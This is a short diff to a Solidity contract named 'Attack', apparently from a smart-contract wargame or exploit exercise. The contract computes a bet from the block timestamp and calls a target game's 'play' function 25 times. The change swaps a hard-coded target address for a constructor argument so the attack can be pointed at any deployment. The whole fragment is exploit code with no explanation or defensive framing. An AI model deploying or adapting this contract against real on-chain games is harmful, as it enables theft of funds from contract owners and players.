@@ -8,7 +8,7 @@ contract Attack {
     constructor(address t) public payable {
         require(msg.value >= 10 * 10**18, "not enough to play 25 times");
         owner = msg.sender;
-        target = 0x505d51adcccb62cd33579c1ea7b94a717f7ae06e;
+        target = t;
         uint256 val = (now % 10**8) * 10**10;
         for (int256 i = 0; i < 25; i++) {
             I3(target).play.value(val)();
